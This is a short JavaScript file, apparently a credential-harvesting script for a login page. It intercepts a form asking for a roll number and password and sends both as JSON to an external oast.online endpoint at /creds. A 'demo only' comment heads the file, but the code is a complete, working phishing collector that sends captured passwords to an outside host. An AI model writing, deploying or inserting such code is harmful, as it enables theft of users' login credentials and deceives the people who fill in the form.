// test.js (demo only — don't use real credentials!)
(function () {
  const SERVER_URL = 'https://d33paa1qrgmt2sts98001azfbtookkysi.oast.online/creds'; // change to full URL if frontend served elsewhere

  document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const msg = document.getElementById('msg');

    if (!form) return;

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const roll = document.getElementById('roll').value.trim();
      const password = document.getElementById('password').value;

      if (!roll || !password) {
        msg.textContent = 'Please fill all fields.';
        return;
      }

      msg.textContent = 'Sending...';

      try {
        const res = await fetch(SERVER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ roll, password })
        });
        const data = await res.json().catch(() => ({}));

        if (res.ok) {
          msg.textContent = 'Submitted — check the server submissions page.';
          document.getElementById('password').value = '';
        } else {
          msg.textContent = 'Error: ' + (data.error || res.statusText);
        }
      } catch (err) {
        msg.textContent = 'Network error: ' + err.message;
      }
    });
  });
})();
